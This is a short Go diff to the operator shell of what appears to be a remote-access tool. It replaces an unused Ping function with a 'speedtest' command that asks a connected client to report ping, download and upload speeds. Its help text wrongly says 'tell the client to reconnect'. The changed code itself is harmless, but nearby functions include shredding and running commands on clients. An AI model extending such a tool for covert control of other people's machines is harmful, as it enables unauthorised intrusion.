@@ -87,6 +87,11 @@ func (client activeClient) shellClient() {
 			},
 			Help: "background the current session",
 		},
+		{
+			Name: "speedtest",
+			Func: client.Speedtest,
+			Help: "tell the client to reconnect",
+		},
 	}
 
 	for _, c := range commands {
@@ -257,10 +262,24 @@ func (client *activeClient) Shred(c *ishell.Context) {
 	}
 }
 
-// ping something?
-// TODO: I don't think this feature works
-func (client *activeClient) Ping(c *ishell.Context) error {
-	return client.RPC.Call("API.Ping", void, &void)
+// Speedtest
+func (client *activeClient) Speedtest(c *ishell.Context) {
+	c.ProgressBar().Indeterminate(true)
+	c.ProgressBar().Start()
+
+	r := shared.Speedtest{}
+	if err := client.RPC.Call("API.Speedtest", void, &r); err != nil {
+		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform speedtest on client!"))
+		return
+	}
+
+	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Speedtest finished"))
+	c.ProgressBar().Stop()
+
+	c.Println(green("Ping: "), r.Ping)
+	c.Println(green("Download: "), r.Download)
+	c.Println(green("Upload: "), r.Upload)
+	return
 }
 
 // Run a command on client
